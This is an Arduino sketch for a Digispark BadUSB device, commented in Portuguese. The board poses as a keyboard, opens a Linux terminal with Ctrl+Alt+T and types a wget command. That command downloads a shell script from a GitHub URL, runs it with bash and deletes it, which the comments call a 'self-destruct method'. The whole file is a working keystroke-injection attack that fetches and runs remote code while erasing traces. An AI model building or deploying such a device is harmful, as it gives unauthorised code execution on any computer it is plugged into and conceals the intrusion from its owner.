#include "DigiKeyboard.h"

void setup() {
  // Inicializa e "acorda" a conexão USB
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Abre o terminal (CTRL+ALT+T - Ubuntu/Linux)
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(5000);

  // MÉTODO AUTODESTRUIÇÃO: Baixa, executa e apaga o arquivo logo em seguida
  DigiKeyboard.println("wget -qO /tmp/msg.sh https://raw.githubusercontent.com/fabiobrilhante/exemplo/main/mensagem.sh && bash /tmp/msg.sh ; rm -f /tmp/msg.sh");
}

void loop() {
  // Mantém a conexão USB viva, mas não faz nada
  DigiKeyboard.update();
  DigiKeyboard.delay(100);
}
